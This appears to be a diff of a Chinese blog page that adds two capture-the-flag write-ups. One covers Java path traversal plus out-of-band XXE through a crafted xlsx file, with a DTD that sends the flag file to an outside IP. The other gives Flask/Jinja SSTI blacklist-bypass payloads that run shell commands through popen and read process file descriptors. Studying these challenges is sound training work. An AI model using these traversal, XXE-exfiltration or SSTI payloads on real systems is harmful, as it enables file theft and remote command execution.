@@ -217,7 +217,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-08-06 15:36:16" itemprop="dateModified" datetime="2021-08-06T15:36:16+08:00">2021-08-06</time>
+                <time title="修改时间：2021-08-11 00:16:30" itemprop="dateModified" datetime="2021-08-11T00:16:30+08:00">2021-08-11</time>
               </span>
 
           <br>
@@ -226,14 +226,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.2k</span>
+              <span>5.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>5 分钟</span>
             </span>
 
         </div>
@@ -287,13 +287,37 @@
 
 
 
+<h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>首先我们尝试filename是否存在任意文件下载，输入../报错，报错信息中有WEB-INF，这是java框架中的web应用的安全目录，应该是web.xml文件泄露，我们读取一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p>有时候耐心还是很重要，穿越了很多层目录。</p>
+<p>我们将三个class文件下载，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/UploadServlet.class</span><br></pre></td></tr></table></figure>
+
+<p>然后通过jd-gui反编译获得源码。这里给出重要代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName))</span><br><span class="line">         try &#123;</span><br><span class="line">           Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">           Sheet sheet = wb1.getSheetAt(0);</span><br><span class="line">           System.out.println(sheet.getFirstRowNum());</span><br><span class="line">         &#125; catch (InvalidFormatException e) &#123;</span><br><span class="line">           System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">         &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>这是一个excel和xxe结合的漏洞，CVE-2014-3529，是一个比较老的漏洞了。</p>
+<p>当文件头为excel-并且结尾为xlsx时会对该文件进行操作，可能存在xxe漏洞。</p>
+<p>我们先新建一个excel-1.xlsx文件，再改后缀为zip，解压缩，对文件夹里面的[Content_Types].xml进行修改，修改完后再压缩成zip，改后缀为xlsx。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.44.128/file.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
 
 
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.44.128:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
 
+<p>再监听端口9999得到flag。</p>
+<h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p><em><strong>本题关键在于如何绕过黑名单，如下划线_通过/x5f十六进制代替；</strong></em></p>
+<p><em><strong>.通过[]包含绕过；</strong></em></p>
+<p><em><strong>单引号通过双引号绕过。</strong></em></p>
+<p>绕过后，我们要查找可以执行命令的类。找到<code>os._wrap_close</code>在127.</p>
+<p>发现可用类有<code>popen</code>  <code>open</code>  <code>system</code></p>
+<p>我们读取app.py文件，查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat app*&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-
-
+<p>发现源码被删除，还好flag存在config里面了，查看一下config中flag，再将flag解密出来就行了。</p>
+<p>或者使用<code>_frozen_importlib_external.FileLoader</code>类，再用get_data方法读取当前fd目录下运行的进程3，即/proc/self/fd/3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](0, &quot;/proc/self/fd/3&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 
       
@@ -788,13 +812,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">244k</span>
+    <span title="站点总字数">246k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">3:41</span>
+    <span title="站点阅读时长">3:43</span>
 </div>
 
         
